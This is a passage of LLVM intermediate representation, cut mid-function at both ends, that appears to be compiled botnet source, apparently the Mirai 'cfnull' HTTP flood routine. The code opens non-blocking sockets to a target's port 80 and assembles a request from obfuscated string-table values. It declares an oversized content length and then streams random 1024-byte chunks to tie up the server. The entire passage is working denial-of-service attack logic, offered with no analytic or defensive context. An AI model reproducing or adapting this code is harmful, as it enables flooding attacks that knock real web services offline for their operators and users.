  %244 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %245 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %244, i32 0, i32 1
  %246 = load i8, i8* %245, align 4
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %328

249:                                              ; preds = %243
  %250 = bitcast %struct.sockaddr_in* %28 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %250, i8 0, i64 16, i1 false)
  %251 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %252 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 4
  %254 = icmp ne i32 %253, -1
  br i1 %254, label %255, label %260

255:                                              ; preds = %249
  %256 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %257 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = call i32 @close(i32 noundef %258)
  br label %260

260:                                              ; preds = %255, %249
  %261 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #6
  %262 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %263 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %262, i32 0, i32 0
  store i32 %261, i32* %263, align 4
  %264 = icmp eq i32 %261, -1
  br i1 %264, label %265, label %266

265:                                              ; preds = %260
  br label %750

266:                                              ; preds = %260
  %267 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %268 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 4
  %270 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %271 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 4
  %273 = call i32 (i32, i32, ...) @fcntl(i32 noundef %272, i32 noundef 3, i32 noundef 0)
  %274 = or i32 2048, %273
  %275 = call i32 (i32, i32, ...) @fcntl(i32 noundef %269, i32 noundef 4, i32 noundef %274)
  store i32 65535, i32* %10, align 4
  %276 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %277 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 4
  %279 = bitcast i32* %10 to i8*
  %280 = call i32 @setsockopt(i32 noundef %278, i32 noundef 0, i32 noundef 8, i8* noundef %279, i32 noundef 4) #6
  %281 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 0
  store i16 2, i16* %281, align 4
  %282 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %283 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %282, i32 0, i32 4
  %284 = load i32, i32* %283, align 4
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %286 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %285, i32 0, i32 0
  store i32 %284, i32* %286, align 4
  %287 = call zeroext i16 @htons(i16 noundef zeroext 80) #7
  %288 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 1
  store i16 %287, i16* %288, align 2
  %289 = load i32, i32* %23, align 4
  %290 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %291 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %290, i32 0, i32 2
  store i32 %289, i32* %291, align 4
  %292 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %293 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %292, i32 0, i32 1
  store i8 2, i8* %293, align 4
  %294 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %295 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 4
  %297 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %298 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %298, %struct.sockaddr** %297, align 8
  %299 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %300 = load %struct.sockaddr*, %struct.sockaddr** %299, align 8
  %301 = call i32 @connect(i32 noundef %296, %struct.sockaddr* %300, i32 noundef 16)
  %302 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %303 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %302, i32 0, i32 0
  %304 = load i32, i32* %303, align 4
  %305 = srem i32 %304, 64
  %306 = zext i32 %305 to i64
  %307 = shl i64 1, %306
  %308 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %309 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %310 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %309, i32 0, i32 0
  %311 = load i32, i32* %310, align 4
  %312 = sdiv i32 %311, 64
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds [16 x i64], [16 x i64]* %308, i64 0, i64 %313
  %315 = load i64, i64* %314, align 8
  %316 = or i64 %315, %307
  store i64 %316, i64* %314, align 8
  %317 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %318 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 4
  %320 = load i32, i32* %19, align 4
  %321 = icmp sgt i32 %319, %320
  br i1 %321, label %322, label %327

322:                                              ; preds = %266
  %323 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %324 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 4
  %326 = add nsw i32 %325, 1
  store i32 %326, i32* %19, align 4
  br label %327

327:                                              ; preds = %322, %266
  br label %749

328:                                              ; preds = %243
  %329 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %330 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %329, i32 0, i32 1
  %331 = load i8, i8* %330, align 4
  %332 = zext i8 %331 to i32
  %333 = icmp eq i32 %332, 2
  br i1 %333, label %334, label %377

334:                                              ; preds = %328
  %335 = load i32, i32* %23, align 4
  %336 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %337 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %336, i32 0, i32 2
  %338 = load i32, i32* %337, align 4
  %339 = sub i32 %335, %338
  %340 = icmp ugt i32 %339, 30
  br i1 %340, label %341, label %350

341:                                              ; preds = %334
  %342 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %343 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %342, i32 0, i32 1
  store i8 0, i8* %343, align 4
  %344 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %345 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %344, i32 0, i32 0
  %346 = load i32, i32* %345, align 4
  %347 = call i32 @close(i32 noundef %346)
  %348 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %349 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %348, i32 0, i32 0
  store i32 -1, i32* %349, align 4
  br label %750

350:                                              ; preds = %334
  %351 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %352 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %351, i32 0, i32 0
  %353 = load i32, i32* %352, align 4
  %354 = srem i32 %353, 64
  %355 = zext i32 %354 to i64
  %356 = shl i64 1, %355
  %357 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %358 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %359 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 4
  %361 = sdiv i32 %360, 64
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [16 x i64], [16 x i64]* %357, i64 0, i64 %362
  %364 = load i64, i64* %363, align 8
  %365 = or i64 %364, %356
  store i64 %365, i64* %363, align 8
  %366 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %367 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %366, i32 0, i32 0
  %368 = load i32, i32* %367, align 4
  %369 = load i32, i32* %19, align 4
  %370 = icmp sgt i32 %368, %369
  br i1 %370, label %371, label %376

371:                                              ; preds = %350
  %372 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %373 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %372, i32 0, i32 0
  %374 = load i32, i32* %373, align 4
  %375 = add nsw i32 %374, 1
  store i32 %375, i32* %19, align 4
  br label %376

376:                                              ; preds = %371, %350
  br label %748

377:                                              ; preds = %328
  %378 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %379 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %378, i32 0, i32 1
  %380 = load i8, i8* %379, align 4
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 5
  br i1 %382, label %383, label %572

383:                                              ; preds = %377
  %384 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  call void @util_zero(i8* noundef %384, i32 noundef 10240)
  %385 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %386 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %387 = call i32 @util_strlen(i8* noundef %386)
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds i8, i8* %385, i64 %388
  %390 = call i32 @util_strcpy(i8* noundef %389, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0))
  %391 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %392 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %393 = call i32 @util_strlen(i8* noundef %392)
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds i8, i8* %391, i64 %394
  call void @rand_alphastr(i8* noundef %395, i32 noundef 16)
  %396 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %397 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %398 = call i32 @util_strlen(i8* noundef %397)
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds i8, i8* %396, i64 %399
  %401 = call i32 @util_strcpy(i8* noundef %400, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %402 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %403 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %404 = call i32 @util_strlen(i8* noundef %403)
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds i8, i8* %402, i64 %405
  %407 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %408 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %407, i32 0, i32 5
  %409 = getelementptr inbounds [512 x i8], [512 x i8]* %408, i64 0, i64 0
  %410 = call i32 @util_strcpy(i8* noundef %406, i8* noundef %409)
  %411 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %412 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %413 = call i32 @util_strlen(i8* noundef %412)
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds i8, i8* %411, i64 %414
  %416 = call i32 @util_strcpy(i8* noundef %415, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %417 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %418 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %419 = call i32 @util_strlen(i8* noundef %418)
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds i8, i8* %417, i64 %420
  %422 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %423 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %422, i32 0, i32 6
  %424 = getelementptr inbounds [129 x i8], [129 x i8]* %423, i64 0, i64 0
  %425 = call i32 @util_strcpy(i8* noundef %421, i8* noundef %424)
  %426 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %427 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %428 = call i32 @util_strlen(i8* noundef %427)
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds i8, i8* %426, i64 %429
  %431 = call i32 @util_strcpy(i8* noundef %430, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 39)
  %432 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %433 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %434 = call i32 @util_strlen(i8* noundef %433)
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds i8, i8* %432, i64 %435
  %437 = call i8* @table_retrieve_val(i32 noundef 39, i32* noundef null)
  %438 = call i32 @util_strcpy(i8* noundef %436, i8* noundef %437)
  call void @table_lock_val(i8 noundef zeroext 39)
  %439 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %440 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %441 = call i32 @util_strlen(i8* noundef %440)
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds i8, i8* %439, i64 %442
  %444 = call i32 @util_strcpy(i8* noundef %443, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 40)
  %445 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %446 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %447 = call i32 @util_strlen(i8* noundef %446)
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds i8, i8* %445, i64 %448
  %450 = call i8* @table_retrieve_val(i32 noundef 40, i32* noundef null)
  %451 = call i32 @util_strcpy(i8* noundef %449, i8* noundef %450)
  call void @table_lock_val(i8 noundef zeroext 40)
  %452 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %453 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %454 = call i32 @util_strlen(i8* noundef %453)
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds i8, i8* %452, i64 %455
  %457 = call i32 @util_strcpy(i8* noundef %456, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 41)
  %458 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %459 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %460 = call i32 @util_strlen(i8* noundef %459)
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds i8, i8* %458, i64 %461
  %463 = call i8* @table_retrieve_val(i32 noundef 41, i32* noundef null)
  %464 = call i32 @util_strcpy(i8* noundef %462, i8* noundef %463)
  call void @table_lock_val(i8 noundef zeroext 41)
  %465 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %466 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %467 = call i32 @util_strlen(i8* noundef %466)
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds i8, i8* %465, i64 %468
  %470 = call i32 @util_strcpy(i8* noundef %469, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 42)
  %471 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %472 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %473 = call i32 @util_strlen(i8* noundef %472)
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds i8, i8* %471, i64 %474
  %476 = call i8* @table_retrieve_val(i32 noundef 42, i32* noundef null)
  %477 = call i32 @util_strcpy(i8* noundef %475, i8* noundef %476)
  call void @table_lock_val(i8 noundef zeroext 42)
  %478 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %479 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %480 = call i32 @util_strlen(i8* noundef %479)
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds i8, i8* %478, i64 %481
  %483 = call i32 @util_strcpy(i8* noundef %482, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 48)
  %484 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %485 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %486 = call i32 @util_strlen(i8* noundef %485)
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds i8, i8* %484, i64 %487
  %489 = call i8* @table_retrieve_val(i32 noundef 48, i32* noundef null)
  %490 = call i32 @util_strcpy(i8* noundef %488, i8* noundef %489)
  call void @table_lock_val(i8 noundef zeroext 48)
  %491 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %492 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %493 = call i32 @util_strlen(i8* noundef %492)
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds i8, i8* %491, i64 %494
  %496 = call i32 @util_strcpy(i8* noundef %495, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 49)
  %497 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %498 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %499 = call i32 @util_strlen(i8* noundef %498)
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds i8, i8* %497, i64 %500
  %502 = call i8* @table_retrieve_val(i32 noundef 49, i32* noundef null)
  %503 = call i32 @util_strcpy(i8* noundef %501, i8* noundef %502)
  call void @table_lock_val(i8 noundef zeroext 49)
  %504 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %505 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %506 = call i32 @util_strlen(i8* noundef %505)
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds i8, i8* %504, i64 %507
  %509 = call i32 @util_strcpy(i8* noundef %508, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %510 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %511 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %512 = call i32 @util_strlen(i8* noundef %511)
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds i8, i8* %510, i64 %513
  %515 = call i32 @util_strcpy(i8* noundef %514, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %516 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %517 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %516, i32 0, i32 7
  store i32 83886080, i32* %517, align 4
  %518 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %519 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 4
  %521 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %522 = getelementptr inbounds [10240 x i8], [10240 x i8]* %30, i64 0, i64 0
  %523 = call i32 @util_strlen(i8* noundef %522)
  %524 = sext i32 %523 to i64
  %525 = call i64 @send(i32 noundef %520, i8* noundef %521, i64 noundef %524, i32 noundef 16384)
  %526 = load i32, i32* %23, align 4
  %527 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %528 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %527, i32 0, i32 3
  store i32 %526, i32* %528, align 4
  %529 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %530 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %529, i32 0, i32 1
  store i8 8, i8* %530, align 4
  %531 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %532 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %531, i32 0, i32 0
  %533 = load i32, i32* %532, align 4
  %534 = srem i32 %533, 64
  %535 = zext i32 %534 to i64
  %536 = shl i64 1, %535
  %537 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %538 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %539 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %538, i32 0, i32 0
  %540 = load i32, i32* %539, align 4
  %541 = sdiv i32 %540, 64
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds [16 x i64], [16 x i64]* %537, i64 0, i64 %542
  %544 = load i64, i64* %543, align 8
  %545 = or i64 %544, %536
  store i64 %545, i64* %543, align 8
  %546 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %547 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %546, i32 0, i32 0
  %548 = load i32, i32* %547, align 4
  %549 = srem i32 %548, 64
  %550 = zext i32 %549 to i64
  %551 = shl i64 1, %550
  %552 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %553 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %554 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %553, i32 0, i32 0
  %555 = load i32, i32* %554, align 4
  %556 = sdiv i32 %555, 64
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds [16 x i64], [16 x i64]* %552, i64 0, i64 %557
  %559 = load i64, i64* %558, align 8
  %560 = or i64 %559, %551
  store i64 %560, i64* %558, align 8
  %561 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %562 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 4
  %564 = load i32, i32* %19, align 4
  %565 = icmp sgt i32 %563, %564
  br i1 %565, label %566, label %571

566:                                              ; preds = %383
  %567 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %568 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 4
  %570 = add nsw i32 %569, 1
  store i32 %570, i32* %19, align 4
  br label %571

571:                                              ; preds = %566, %383
  br label %747

572:                                              ; preds = %377
  %573 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %574 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %573, i32 0, i32 1
  %575 = load i8, i8* %574, align 4
  %576 = zext i8 %575 to i32
  %577 = icmp eq i32 %576, 8
  br i1 %577, label %578, label %703

578:                                              ; preds = %572
  store i32 0, i32* %31, align 4
  %579 = bitcast [1025 x i8]* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %579, i8 0, i64 1025, i1 false)
  %580 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  call void @util_zero(i8* noundef %580, i32 noundef 1025)
  %581 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  call void @rand_alphastr(i8* noundef %581, i32 noundef 1024)
  %582 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %583 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %582, i32 0, i32 7
  %584 = load i32, i32* %583, align 4
  %585 = icmp sle i32 %584, 0
  br i1 %585, label %586, label %591

586:                                              ; preds = %578
  %587 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %588 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %587, i32 0, i32 0
  %589 = load i32, i32* %588, align 4
  %590 = call i64 @send(i32 noundef %589, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i64 noundef 3, i32 noundef 16384)
  br label %673

591:                                              ; preds = %578
  %592 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %593 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %592, i32 0, i32 7
  %594 = load i32, i32* %593, align 4
  %595 = icmp slt i32 %594, 1024
  br i1 %595, label %596, label %602

596:                                              ; preds = %591
  %597 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %598 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %597, i32 0, i32 7
  %599 = load i32, i32* %598, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 %600
  store i8 0, i8* %601, align 1
  br label %602

602:                                              ; preds = %596, %591
  %603 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %604 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %603, i32 0, i32 7
  %605 = load i32, i32* %604, align 4
  %606 = icmp sge i32 %605, 1024
  br i1 %606, label %607, label %630

607:                                              ; preds = %602
  %608 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %609 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %608, i32 0, i32 7
  %610 = load i32, i32* %609, align 4
  %611 = srem i32 %610, 1024
  %612 = icmp eq i32 %611, 0
  br i1 %612, label %613, label %630

613:                                              ; preds = %607
  %614 = bitcast [4 x i8]* %33 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %614, i8 0, i64 4, i1 false)
  %615 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  call void @util_zero(i8* noundef %615, i32 noundef 4)
  %616 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  %617 = call i8* @util_itoa(i32 noundef 1024, i32 noundef 16, i8* noundef %616)
  %618 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %619 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %618, i32 0, i32 0
  %620 = load i32, i32* %619, align 4
  %621 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  %622 = getelementptr inbounds [4 x i8], [4 x i8]* %33, i64 0, i64 0
  %623 = call i32 @util_strlen(i8* noundef %622)
  %624 = sext i32 %623 to i64
  %625 = call i64 @send(i32 noundef %620, i8* noundef %621, i64 noundef %624, i32 noundef 16384)
  %626 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %627 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %626, i32 0, i32 0
  %628 = load i32, i32* %627, align 4
  %629 = call i64 @send(i32 noundef %628, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  br label %630

630:                                              ; preds = %613, %607, %602
  %631 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %632 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %631, i32 0, i32 0
  %633 = load i32, i32* %632, align 4
  %634 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  %635 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  %636 = call i32 @util_strlen(i8* noundef %635)
  %637 = sext i32 %636 to i64
  %638 = call i64 @send(i32 noundef %633, i8* noundef %634, i64 noundef %637, i32 noundef 16384)
  %639 = trunc i64 %638 to i32
  store i32 %639, i32* %31, align 4
  %640 = icmp eq i32 %639, -1
  br i1 %640, label %641, label %644

641:                                              ; preds = %630
  %642 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %643 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %642, i32 0, i32 1
  store i8 1, i8* %643, align 4
  br label %750

644:                                              ; preds = %630
  %645 = load i32, i32* %31, align 4
